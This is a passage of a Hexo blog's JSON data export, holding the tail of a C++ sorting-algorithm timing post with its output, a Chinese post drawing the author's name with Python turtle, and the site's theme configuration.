class=\"string\">&quot;ms&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t\t\tL.elem[i]=rand();</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_start);</span><br><span class=\"line\">\t\tBubbleSort(L);</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_over);</span><br><span class=\"line\">\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;冒泡排序:&quot;</span>&lt;&lt;run_time&lt;&lt;<span class=\"string\">&quot;ms&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t\t\tL.elem[i]=rand();</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_start);</span><br><span class=\"line\">\t\tQuickSort(L);</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_over);</span><br><span class=\"line\">\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;快速排序:&quot;</span>&lt;&lt;run_time&lt;&lt;<span class=\"string\">&quot;ms&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(MAXN&gt;=<span class=\"number\">10000</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Output\"><a href=\"#Output\" class=\"headerlink\" title=\"Output\"></a>Output</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第1次测试, 数量级:10</span><br><span class=\"line\"></span><br><span class=\"line\">插入排序:0.00037758ms</span><br><span class=\"line\">二分排序:0.00037758ms</span><br><span class=\"line\">希尔排序:0.00302064ms</span><br><span class=\"line\">冒泡排序:0.00037758ms</span><br><span class=\"line\">快速排序:0.000755161ms</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">第2次测试, 数量级:100</span><br><span class=\"line\"></span><br><span class=\"line\">插入排序:0.00717403ms</span><br><span class=\"line\">二分排序:0.00830677ms</span><br><span class=\"line\">希尔排序:0.0256755ms</span><br><span class=\"line\">冒泡排序:0.027941ms</span><br><span class=\"line\">快速排序:0.00717403ms</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">第3次测试, 数量级:1000</span><br><span class=\"line\"></span><br><span class=\"line\">插入排序:0.65548ms</span><br><span class=\"line\">二分排序:0.746099ms</span><br><span class=\"line\">希尔排序:0.288849ms</span><br><span class=\"line\">冒泡排序:2.10841ms</span><br><span class=\"line\">快速排序:0.0887314ms</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">第4次测试, 数量级:10000</span><br><span class=\"line\"></span><br><span class=\"line\">插入排序:81.4585ms</span><br><span class=\"line\">二分排序:73.2691ms</span><br><span class=\"line\">希尔排序:4.76695ms</span><br><span class=\"line\">冒泡排序:357.605ms</span><br><span class=\"line\">快速排序:1.55676ms</span><br></pre></td></tr></table></figure>"},{"title":"Turtle绘制字体","date":"2020-04-08T08:08:24.000Z","abbrlink":"50bbd1a0","_content":"今天闲着没事，就用python的turtle库绘制了一下自己的名字（其实是老师留的作业）。\n咳咳，言归正传，我先网上选了个好看又好画的字体，于是保存下载画图打开，这样我们就有了每个笔画的坐标，接下来就开始操作了（嘻嘻）。\n\n<!--more-->\n```py\nfrom turtle import *\nstartx, starty = -300, 300\ndef locate(x, y):\n    penup()\n    goto(startx + x, starty - y)\n    pendown()\n\ndef draw(angle, lenth):\n    seth(angle)\n    forward(lenth)\n\ndef main():\n    pensize(6)\n    speed(5)\n    pencolor(\"red\")\n    # G\n    locate(222, 77)\n    draw(180, 80)\n    draw(270, 130)\n    draw(0, 60)\n    locate(164, 126)\n    draw(0, 64)\n    locate(214, 126)\n    draw(270, 86)\n    # Y\n    locate(264, 74)\n    draw(270, 56)\n    locate(340, 74)\n    draw(270, 56)\n    draw(180, 44)\n    draw(270, 84)\n    # H\n    locate(384, 74)\n    draw(270, 140)\n    locate(400, 128)\n    draw(0, 48)\n    locate(460, 74)\n    draw(270, 140)\n    # 郭\n    locate(78, 285)\n    draw(270, 20)\n    locate(40, 305)\n    draw(0, 80)\n    locate(50, 325)\n    draw(270, 25)\n    locate(50, 325)\n    draw(0, 60)\n    draw(270, 25)\n    locate(50, 350)\n    draw(0, 60)\n    locate(46, 364)\n    draw(0, 60)\n    draw(270, 20)\n    draw(180, 25)\n    draw(270, 70)\n    draw(180, 30)\n    locate(38, 402)\n    draw(0, 80)\n    locate(130, 304)\n    draw(270, 155)\n    locate(130, 304)\n    draw(0, 42)\n    draw(270, 46)\n    draw(180, 30)\n    draw(0, 30)\n    draw(270, 60)\n    draw(180, 30)\n    # 永\n    locate(270, 295)\n    draw(0, 46)\n    locate(250, 325)\n    draw(0, 54)\n    draw(270, 128)\n    draw(180, 38)\n    locate(232, 356)\n    draw(0, 38)\n    draw(270, 60)\n    draw(180, 38)\n    locate(370, 356)\n    draw(180, 38)\n    draw(270, 60)\n    draw(0, 38)\n    # 航\n    locate(438, 286)\n    draw(270, 24)\n    locate(428, 312)\n    draw(270, 140)\n    draw(180, 18)\n    locate(428, 312)\n    draw(0, 42)\n    draw(270, 140)\n    draw(180, 18)\n    locate(446, 328)\n    draw(270, 20)\n    locate(414, 363)\n    draw(0, 56)\n    locate(446, 383)\n    draw(270, 34)\n    locate(515, 286)\n    draw(270, 24)\n    locate(478, 310)\n    draw(0, 80)\n    locate(498, 342)\n    draw(270, 108)\n    draw(180, 20)\n    locate(498, 342)\n    draw(0, 42)\n    draw(270, 106)\n    draw(0, 20)\n    hideturtle()\n    done()\n\nif __name__ == \"__main__\":\n    main()\n```\n面重点来了，字不重要，看图！！！\n![](https://cdn.file.todest.cn/pic/20200511.png)","source":"_posts/Turtle绘制字体.md","raw":"---\ntitle: Turtle绘制字体\ndate: 2020-04-08 16:08:24\ncategories:\n  - 编程语言\n  - Python\ntags:\n  - Python\n  - turtle\nabbrlink: 50bbd1a0\n---\n今天闲着没事，就用python的turtle库绘制了一下自己的名字（其实是老师留的作业）。\n咳咳，言归正传，我先网上选了个好看又好画的字体，于是保存下载画图打开，这样我们就有了每个笔画的坐标，接下来就开始操作了（嘻嘻）。\n\n<!--more-->\n```py\nfrom turtle import *\nstartx, starty = -300, 300\ndef locate(x, y):\n    penup()\n    goto(startx + x, starty - y)\n    pendown()\n\ndef draw(angle, lenth):\n    seth(angle)\n    forward(lenth)\n\ndef main():\n    pensize(6)\n    speed(5)\n    pencolor(\"red\")\n    # G\n    locate(222, 77)\n    draw(180, 80)\n    draw(270, 130)\n    draw(0, 60)\n    locate(164, 126)\n    draw(0, 64)\n    locate(214, 126)\n    draw(270, 86)\n    # Y\n    locate(264, 74)\n    draw(270, 56)\n    locate(340, 74)\n    draw(270, 56)\n    draw(180, 44)\n    draw(270, 84)\n    # H\n    locate(384, 74)\n    draw(270, 140)\n    locate(400, 128)\n    draw(0, 48)\n    locate(460, 74)\n    draw(270, 140)\n    # 郭\n    locate(78, 285)\n    draw(270, 20)\n    locate(40, 305)\n    draw(0, 80)\n    locate(50, 325)\n    draw(270, 25)\n    locate(50, 325)\n    draw(0, 60)\n    draw(270, 25)\n    locate(50, 350)\n    draw(0, 60)\n    locate(46, 364)\n    draw(0, 60)\n    draw(270, 20)\n    draw(180, 25)\n    draw(270, 70)\n    draw(180, 30)\n    locate(38, 402)\n    draw(0, 80)\n    locate(130, 304)\n    draw(270, 155)\n    locate(130, 304)\n    draw(0, 42)\n    draw(270, 46)\n    draw(180, 30)\n    draw(0, 30)\n    draw(270, 60)\n    draw(180, 30)\n    # 永\n    locate(270, 295)\n    draw(0, 46)\n    locate(250, 325)\n    draw(0, 54)\n    draw(270, 128)\n    draw(180, 38)\n    locate(232, 356)\n    draw(0, 38)\n    draw(270, 60)\n    draw(180, 38)\n    locate(370, 356)\n    draw(180, 38)\n    draw(270, 60)\n    draw(0, 38)\n    # 航\n    locate(438, 286)\n    draw(270, 24)\n    locate(428, 312)\n    draw(270, 140)\n    draw(180, 18)\n    locate(428, 312)\n    draw(0, 42)\n    draw(270, 140)\n    draw(180, 18)\n    locate(446, 328)\n    draw(270, 20)\n    locate(414, 363)\n    draw(0, 56)\n    locate(446, 383)\n    draw(270, 34)\n    locate(515, 286)\n    draw(270, 24)\n    locate(478, 310)\n    draw(0, 80)\n    locate(498, 342)\n    draw(270, 108)\n    draw(180, 20)\n    locate(498, 342)\n    draw(0, 42)\n    draw(270, 106)\n    draw(0, 20)\n    hideturtle()\n    done()\n\nif __name__ == \"__main__\":\n    main()\n```\n面重点来了，字不重要，看图！！！\n![](https://cdn.file.todest.cn/pic/20200511.png)","slug":"Turtle绘制字体","published":1,"updated":"2020-12-01T14:45:51.434Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkbv002hqse57uw78mkd","content":"<p>今天闲着没事，就用python的turtle库绘制了一下自己的名字（其实是老师留的作业）。<br>咳咳，言归正传，我先网上选了个好看又好画的字体，于是保存下载画图打开，这样我们就有了每个笔画的坐标，接下来就开始操作了（嘻嘻）。</p>\n<a id=\"more\"></a>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> turtle <span class=\"keyword\">import</span> *</span><br><span class=\"line\">startx, starty = <span class=\"number\">-300</span>, <span class=\"number\">300</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">locate</span>(<span class=\"params\">x, y</span>):</span></span><br><span class=\"line\">    penup()</span><br><span class=\"line\">    goto(startx + x, starty - y)</span><br><span class=\"line\">    pendown()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">draw</span>(<span class=\"params\">angle, lenth</span>):</span></span><br><span class=\"line\">    seth(angle)</span><br><span class=\"line\">    forward(lenth)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">    pensize(<span class=\"number\">6</span>)</span><br><span class=\"line\">    speed(<span class=\"number\">5</span>)</span><br><span class=\"line\">    pencolor(<span class=\"string\">&quot;red&quot;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># G</span></span><br><span class=\"line\">    locate(<span class=\"number\">222</span>, <span class=\"number\">77</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">80</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">130</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">164</span>, <span class=\"number\">126</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">64</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">214</span>, <span class=\"number\">126</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">86</span>)</span><br><span class=\"line\">    <span class=\"comment\"># Y</span></span><br><span class=\"line\">    locate(<span class=\"number\">264</span>, <span class=\"number\">74</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">56</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">340</span>, <span class=\"number\">74</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">56</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">44</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">84</span>)</span><br><span class=\"line\">    <span class=\"comment\"># H</span></span><br><span class=\"line\">    locate(<span class=\"number\">384</span>, <span class=\"number\">74</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">140</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">400</span>, <span class=\"number\">128</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">48</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">460</span>, <span class=\"number\">74</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">140</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 郭</span></span><br><span class=\"line\">    locate(<span class=\"number\">78</span>, <span class=\"number\">285</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">40</span>, <span class=\"number\">305</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">80</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">50</span>, <span class=\"number\">325</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">25</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">50</span>, <span class=\"number\">325</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">25</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">50</span>, <span class=\"number\">350</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">46</span>, <span class=\"number\">364</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">25</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">70</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">30</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">38</span>, <span class=\"number\">402</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">80</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">130</span>, <span class=\"number\">304</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">155</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">130</span>, <span class=\"number\">304</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">42</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">46</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">30</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">30</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">30</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 永</span></span><br><span class=\"line\">    locate(<span class=\"number\">270</span>, <span class=\"number\">295</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">46</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">250</span>, <span class=\"number\">325</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">54</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">128</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">38</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">232</span>, <span class=\"number\">356</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">38</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">38</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">370</span>, <span class=\"number\">356</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">38</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">60</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">38</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 航</span></span><br><span class=\"line\">    locate(<span class=\"number\">438</span>, <span class=\"number\">286</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">24</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">428</span>, <span class=\"number\">312</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">140</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">18</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">428</span>, <span class=\"number\">312</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">42</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">140</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">18</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">446</span>, <span class=\"number\">328</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">414</span>, <span class=\"number\">363</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">56</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">446</span>, <span class=\"number\">383</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">34</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">515</span>, <span class=\"number\">286</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">24</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">478</span>, <span class=\"number\">310</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">80</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">498</span>, <span class=\"number\">342</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">108</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">180</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\">    locate(<span class=\"number\">498</span>, <span class=\"number\">342</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">42</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">270</span>, <span class=\"number\">106</span>)</span><br><span class=\"line\">    draw(<span class=\"number\">0</span>, <span class=\"number\">20</span>)</span><br><span class=\"line\">    hideturtle()</span><br><span class=\"line\">    done()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n<p>面重点来了，字不重要，看图！！！<br><img data-src=\"https://cdn.file.todest.cn/pic/20200511.png\" alt=\"\"></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":nul